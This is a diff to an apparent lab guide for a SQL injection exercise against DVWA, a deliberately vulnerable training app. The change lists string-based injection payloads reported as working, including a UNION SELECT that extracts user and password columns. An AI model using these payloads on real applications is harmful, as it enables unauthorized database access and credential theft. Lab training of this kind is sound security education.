@@ -101,17 +101,33 @@ This establishes normal application behavior.
 
 ---
 
-## 6. Execute SQL Injection Payload
-1. In the User ID field, enter:
-   ```csharp
-   1 OR 1=1#
-   ```
+## 6. Execute SQL Injection Payload (Validated Payloads)
+
+During testing, multiple SQL injection payloads were evaluated.  
+The following payloads **successfully altered application behavior** and returned multiple database records.
+
+### Payloads That Worked
+
+1. Enter the following payload:
+   ```sql
+   1' OR '1'='1
 2. Click Submit
-3. Observe that multiple database records are returned
+3. Alternatively, the following payloads also produced successful results:
+   ```sql
+   1' OR 1=1-- -
+   ```
+   ```sql
+   1' UNION SELECT user, password FROM users-- -
+   ```
+4. Observe that multiple user records are returned after submission.
 
-This confirms successful SQL injection execution.
+These payloads confirm that the SQL injection point operates in a string-based query context.
 
-***📸 Take screenshot:*** ` sim004-dvwa-sqli-success.png`
+***📸 Take screenshot:*** `sim004-dvwa-sqli-success.png`
+
+> ⚠️ **Note on Payload Validation**  
+> The numeric-based payload `1 OR 1=1#` did **not** return multiple results in this environment.  
+> Only **string-based SQL injection payloads** successfully altered query behavior.
 
 ---
 
